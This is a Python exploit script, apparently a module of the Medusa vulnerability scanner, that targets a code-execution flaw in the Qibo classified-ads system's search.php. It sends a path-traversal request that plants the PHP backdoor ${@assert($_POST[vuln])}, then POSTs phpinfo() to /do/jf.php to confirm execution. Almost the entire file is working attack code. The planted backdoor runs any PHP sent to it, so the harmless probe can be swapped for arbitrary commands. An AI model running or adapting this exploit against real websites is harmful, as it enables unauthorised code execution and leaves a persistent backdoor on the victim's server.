#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibo分类系统search.php 代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0122599
author: Ascotbe
reference: Lucifer
description: search.php代码执行。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[vuln])}"
payload2="/do/jf.php"
post_data = {
    "vuln": "phpinfo();"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        payload_url2 = scheme + "://" + url + payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.post(payload_url2, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            resp2 = requests.post(payload_url2, data=post_data,headers=headers, timeout=5, verify=False)
        con2 = resp2.text
        code = resp.status_code
        if con2.lower().find('configuration file (php.ini) path')!=-1:
            Medusa = "{} 存在qibo分类系统search.php 代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass